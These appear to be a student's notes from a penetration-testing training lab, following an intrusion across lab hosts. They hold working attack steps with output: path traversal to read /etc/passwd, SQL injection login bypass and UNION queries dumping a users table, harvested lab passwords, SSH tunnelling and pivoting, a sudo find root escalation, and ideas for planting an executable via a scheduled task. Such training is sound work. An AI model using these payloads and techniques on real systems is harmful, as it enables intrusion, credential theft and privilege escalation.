
## OPERATION: DRY RUN ##


John the ripper -> https://www.freecodecamp.org/news/crack-passwords-using-john-the-ripper-pentesting-tutorial/

Reverse shell -> https://ioflood.com/blog/bash-reverse-shell/

cronjobs -> https://www.linode.com/docs/guides/how-to-list-cron-jobs/

SITREP: This is a dry run operation to prepare you for tomorrow's real operation. You will be provided with a mission task sheet, RoE, and scope.

Maintain 'low visibility' on the wire, as security products may be in place, and document your actions and results as you will be expected to provide OpNotes at the end of the operation.

Take notes on this document.

Dry Run Operation
XX June 2024
Start Time: 0830
Duration: 3 hours

Type of Operation: Information Systems Penetration Test

Objective:Actively exploit and attack networked information systems for the purposes of identifying and reporting vulnerabilities.

Tasking:Perform all tasks outlined in this document.

Mission Scope:

All public facing systems of target entitiy excluding devices responsible for networking (routers, switches, etc). Known web address will be supplied out of band.

Internal network of target entity excluding devices responsible for networking (routers, switches, etc)


RoE:

Google docs, and all other shareable document platforms, are forbidden during this operation.

All communication platforms and applications, such as Slack or Gmail, are forbidden during this operation.

You are authorized to modify passwords to user accounts.

Writing to disk is authorized on all machines.

You will not destroy data/systems, perform DoS, or otherwise disrupt business operations of any entity during this penetration test.

You will not use Metasploit tools for any affect with the exception of shellcode generation.

You will not target routers, switches or other networking devices.

You will not target entities or systems outside of the scope previously defined.

You will not interfere with other entities' operations in any way.

Prior Approvals: OSINT through publicly available resources. Scrape appropriate web content that will provide operational data. Testing of found credentials. NOT approved to change routing or destroy data.

Data is only encoded into base64

10.50 assigned. -> 10.50.29.144 (public facing) 

### 1. PublicFacingWebsite - 001 ###

#### Perform Reconnaissance  ####

Step 1. student@lin-ops:~$ `nmap 10.50.29.144`

    Starting Nmap 7.60 ( https://nmap.org ) at 2024-01-17 13:51 UTC
    Nmap scan report for 10.50.29.144
    Host is up (0.0043s latency).
    Not shown: 998 filtered ports
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http

    Nmap done: 1 IP address (1 host up) scanned in 4.84 seconds

Step 2: student@lin-ops:~$ `nmap -Pn -sT 10.50.29.144 -p 80 --script http-enum.nse`

    Starting Nmap 7.60 ( https://nmap.org ) at 2024-01-17 13:54 UTC
    Nmap scan report for 10.50.29.144
    Host is up (0.013s latency).

    PORT   STATE SERVICE
    80/tcp open  http
    | http-enum: 
    |   /login.php: Possible admin folder
    |   /login.html: Possible admin folder
    |   /img/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
    |_  /scripts/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'

    Nmap done: 1 IP address (1 host up) scanned in 0.52 seconds

Step 3. Open reminna and login to your linops and open firefox on there. Enter the ip address 10.50.29.144 and see what's on there.... 

Step 4. wget on the `wget -r http://10.50.29.144:80` to download all the files for this address

Do the statements below where there are search pages..
or ... http://10.50.29.144/getcareers.php?myfile=../../../../../../../../etc/hosts
or ... http://10.50.29.144/getcareers.php?myfile=../../../../../../../../etc/passwd

        root:x:0:0:root:/root:/bin/bash
        user2:.....:/bin/sh -> means the user2 can run bash commands 


Step 5. Check /login.html -> gives a login page. Lets try to sql inject it

    1. In both the password and username field, enter: tom' or 1='1
    2. Displays a user, welcome Aaron


Method 2: change inspect element to GET will display

        Array
        (
            [0] => user2
            [name] => user2
            [1] => RntyrfVfNER78
            [pass] => RntyrfVfNER78
        )
        1Array
        (
            [0] => user3
            [name] => user3
            [1] => Obo4GURRnccyrf
            [pass] => Obo4GURRnccyrf
        )
        1Array
        (
            [0] => Lee_Roth
            [name] => Lee_Roth
            [1] => anotherpassword4THEages
            [pass] => anotherpassword4THEages
        )

If a password is not readable check ROT13 -> https://rot13.com/

Cyberchef -> http://10.50.20.30:8000/themes/BattleMap/static/cyberchef.htm

Step 6. Check /login.php

    1. Displays a user, welcome Aaron -> since it says Aaron, it means you're in. 
    2. username could potentially be Aaron

Step 7. Check /img/
    
    1. Found nothing useful here

Step 8. Check /scripts/

    1. Went to http://10.50.29.144/scripts/
    2. Found patent directory and development.py
    3. Patent directory -> Nothing here 
    4. Development.py 

        #!/usr/bin/python3
        import os

        system_user=user2
        user_password=EaglesIsARE78

        ##Developer note

        #script will eventually take above system user credentials and run automated services

        Gives us username as user2 and the password as EaglesIsARE78.

Step 9.  Attempt initial access using the username from step 8 and the password                                                   

#### Attempt Exploitation || Gain Initial Access ####

Step 1. Since tcp and http were open and we've looked at the http section, lets now look at the tcp section. 

Step 2. `ssh user2@10.50.29.144 -D 9050` let's dynamically connect to this user 

other -> type `bash`

If you forgot something in htlm you go to `cd /var/www/html/`

Step 3. logs us in... let's see if we can find additional targets

user2@PublicFacingWebsite:/var/www/html$ `ls -la` to see all the files 

    -rw-r--r-- 1 root root   215 Dec 30 02:01 logout.php -> means this is a file
    drwxr-xr-x 2 root root  4096 Jan 16 17:41 scripts -> means this is a directory

Once you are able to get in, enumerate the file more. Look for hidden files!

#### Find Additional Targets ####

Step 1. `cat /etc/hosts` gives us an additional host

    127.0.0.1 localhost

    # The following lines are desirable for IPv6 capable hosts
    ::1 ip6-localhost ip6-loopback
    fe00::0 ip6-localnet
    ff00::0 ip6-mcastprefix
    ff02::1 ip6-allnodes
    ff02::2 ip6-allrouters
    ff02::3 ip6-allhosts
    192.168.28.181 WebApp

Step 2. Looks like we have a new host called WebApp at 192.168.28.181

#### Pivot to Found Targets ####

Step 1. type bash in the window after login to get to the bash terminal and then run your for loop to do the ping sweep. For loop to be run `for i in {1..254} ;do (ping -c 1 192.168.28.$i | grep "bytes from" &) ;done`

    $ bash
    user2@PublicFacingWebsite:/$ for i in {1..254} ;do (ping -c 1 192.168.28.$i | grep "bytes from" &) ;done
    64 bytes from 192.168.28.172: icmp_seq=1 ttl=63 time=1.13 ms
    64 bytes from 192.168.28.181: icmp_seq=1 ttl=63 time=0.550 ms
    64 bytes from 192.168.28.190: icmp_seq=1 ttl=64 time=0.067 ms

Step 2. We have three addresses, 192.168.28.172, 192.168.28.181 and 192.168.28.190

Step 3. Check 192.168.28.172. student@lin-ops:~$ `proxychains nmap 192.168.28.172` shows that we have:

    Nmap scan report for 192.168.28.172
    Host is up (0.00034s latency).
    Not shown: 999 closed ports
    PORT   STATE SERVICE
    22/tcp open  ssh

    Nmap done: 1 IP address (1 host up) scanned in 0.42 seconds

Step 4. Check 192.168.28.181. student@lin-ops:~$ `proxychains nmap 192.168.28.181`

    Nmap scan report for 192.168.28.181
    Host is up (0.00034s latency).
    Not shown: 998 closed ports
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http

    Nmap done: 1 IP address (1 host up) scanned in 0.36 seconds


Step 5. Check 192.168.28.190 -> ignore this as told by the instructor so the ip to work with is .172 and .181. The later has http and tcp open so lets go for the tcp and see who's this guy. 

Step 6. Since .181 has an http open, let's do an enumeration scan on him. student@lin-ops:~$ `nmap -Pn -sT 192.168.28.181 -p 80 --script http-enum.nse` which will give you this result

    Nmap scan report for 192.168.28.181
    Host is up (0.0035s latency).

    PORT   STATE SERVICE
    80/tcp open  http

    Nmap done: 1 IP address (1 host up) scanned in 0.57 seconds

Step 7. Change the proxy settings. Check notes on how to do this 

#### Step 1 of schema table ####

Step 8. `http://192.168.28.181/pick.php?product=7 or 1=1` increase product until it breaks. Look at the view page source to see how the code looks like. 

#### Step 2 of schema table ####

Step 9. Validate the columns `http://192.168.28.181/pick.php?product=7 union SELECT 1,2,3` Notice that this is also out of order. 

Step 10. Golden statement `http://192.168.28.181/pick.php?product=7 union select table_schema, column_name, table_name FROM information_schema.columns`

#### Step 3 of schema table ####

other way -> `http://192.168.28.181/pick.php?product=7 union select table_schema, 2,3 FROM information_schema.columns` -> shows the types

other way class -> `http://192.168.28.181/pick.php?product=7 union select user_id,name,username FROM siteusers.users` 

Tabel_schema = database name = siteusers

column_Name = column name = users,customer etc

table_Name = table name = username, user-id, id etc

Right click to duplicate the tab

/uniondemo.php?Selection=2 UNION SELECT table_name,1,column_name FROM information_schema.columns

http://192.168.28.181/pick.php?product=7 union select table_schema, column_name, table_name FROM information_schema.columns

        Item 	On Hand 	Price
        HAM 	32 	        $15
        1 	    3 	        $2

        
        siteusers 	users 	$user_id
        siteusers 	users 	$name
        siteusers 	users 	$username


Step 11. Select important information - `http://192.168.28.181/pick.php?product=7 UNION SELECT * FROM siteusers.users`

        Item 	On Hand 	                Price
        HAM 	32 	                        $15
        1 	    Aaron 	                    $Aaron
        2 	    user2 	                    user2
        3 	    user3 	                    $user3
        4 	    Lroth 	                    $Lee_Roth
        1 	    ncnffjbeqlCn$$jbeq 	        $Aaron
        2 	    RntyrfVfNER78 	            $user2
        3 	    Obo4GURRnccyrf 	            $user3
        4 	    anotherpassword4THEages 	$Lroth

Step 12. We have password= ncnffjbeqlCn$$jbeq username= $Aaron. Let's ssh to .172 with this information

Step 13. Let's create a local tunnel to .172 and use Aaron's credentials 

student@lin-ops:~$ ssh user2@10.50.29.144 -L 43434:192.168.28.172:22
student@lin-ops:~$ `ssh Aaron@127.0.0.1 -p 43434` if Aaron woudn't have worked then I'd try user2, user3 and Lroth with the respective passwords 

convert ncnffjbeqlCn$$jbeq to ROTH13 using https://rot13.com/ gives the password as apasswordyPa$$word


### 2. BestWebApp ###

TODO: Review notes for this guy. 

#### Perform Reconnaissance  ####

#### Attempt Exploitation || Gain Initial Access ####

#### Find Additional Targets ####

#### Pivot to Found Targets ####

### 3. RoundSensor  --02 ###

#### Attempt Exploitation || Gain Initial Access and Perform Reconnaissance  ####

Step 00. `cat /etc/passwd` -> nothing on here it's only root and aaron 

Step 0a. `cat /etc/hosts` -> Nothing on here

Step 0b. `Aaron@RoundSensor:/$ cat /etc/crontab `?????

Step 0c. What else again????? TODO? And everything we did on linux day pretty much... syslog and rsyslog conf files 

Step 0d. `netstat -tunap` # check for local listening ports 



Step 1. Check what Aaron can run e.g. `sudo -l` which gives the following 

    $ sudo -l
    Matching Defaults entries for Aaron on RoundSensor:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User Aaron may run the following commands on RoundSensor:
    (ALL) NOPASSWD: /usr/bin/find

Step 0e. Find the SIDor the SGID file that looks out of place comrade@lin1:~$ `find / -type f -perm /6000 -ls 2>/dev/null`

Step 2. Go to GTFO bins and find the vulnerability for find. -> https://gtfobins.github.io/

Step 3. The following command run and changed the user to root `sudo find . -exec /bin/sh \; -quit`

Step 4. You know have root privileges -> Explore everything in the root directory

Step 0f. `cd root`, try to cut and see everything in root `ls` and `ls -la .ssh/authorized_keys` and `cat ab.sh` -> what port is listening on this ssh??? and `ps -elf`and `cat run` and `cat /lib/libhandle.10`

#### Find Additional Targets ####

Step 5. Run `for i in {1..254} ;do (ping -c 1 192.168.28.$i | grep "bytes from" &) ;done` to see which ips are open and this gives 

        64 bytes from 192.168.28.172: icmp_seq=1 ttl=64 time=0.037 ms
        64 bytes from 192.168.28.179: icmp_seq=1 ttl=128 time=1.17 ms
        64 bytes from 192.168.28.190: icmp_seq=1 ttl=64 time=0.353 ms
        64 bytes from 192.168.28.222: icmp_seq=1 ttl=64 time=5.92 ms

        Notice the ttl, ttl for windows is 128. 

Step 6. Check 192.168.28.181. student@lin-ops:~$ `proxychains nmap -Pn 192.168.28.179`

        Nmap scan report for 192.168.28.179
        Host is up (0.00056s latency).
        Not shown: 994 closed ports
        PORT     STATE SERVICE
        22/tcp   open  ssh
        135/tcp  open  msrpc
        139/tcp  open  netbios-ssn
        445/tcp  open  microsoft-ds
        3389/tcp open  ms-wbt-server
        9999/tcp open  abyss

Step 7. 3389/tcp open  ms-wbt-server from step 6 means we can RDP 

Step 8. Check 192.168.28.181. student@lin-ops:~$ `proxychains nmap 192.168.28.222`

        Nmap scan report for 192.168.28.222
        Host is up (0.00060s latency).
        All 1000 scanned ports on 192.168.28.222 are closed

        Nmap done: 1 IP address (1 host up) scanned in 0.61 seconds

#### Pivot to Found Targets ###
 ####

Step 9: Create a local tunnel from extranet to Internal IP

student@lin-ops:~$ `ssh Aaron@localhost -p 43434 -L 43435:192.168.28.179:3389` 

Step 10: Use xrdp to get in the windows box

student@lin-ops:~$ `xfreerdp /v:127.0.0.1:43435 /u:Lroth /p:anotherpassword4THEages /size:1920x1000 +clipboard /cert-ignore` 

### 4. Windows-Workstation --003 ###

#### Perform Reconnaissance  ####

Enter the contents of the files in your users directory - > C:\Users\Lroth\

        C:\Users\Public\Documents\

Ask about persistence Registry 

        Registry Editor 

            Registry Editor -> HKEY_CURRENT_USER -> SOFTWARE -> Microsoft -> KEYED3

        Services  -> Description
        Task Scheduler / Manager  -> Schedule

            See Work in this example something named weird   
            Actions -> Users\Lroth\temp\putty.exe
            Go to this directory and see if you can create a test file 

                Proves you can write to this directory and you are either going to create a new executable or replace a dll here
            
            What if you could rename putty? That means you can put your executable and rename it. You will have a server to pull it from. 

#### Attempt Exploitation || Gain Initial Access ####

#### Find Additional Targets ####

#### Pivot to Found Targets ####

TODO: REVIEW METASPOILT AND PUT THE NOTES ON HERE!!! Reverse_TCP and BUFFER OVERFLOW!!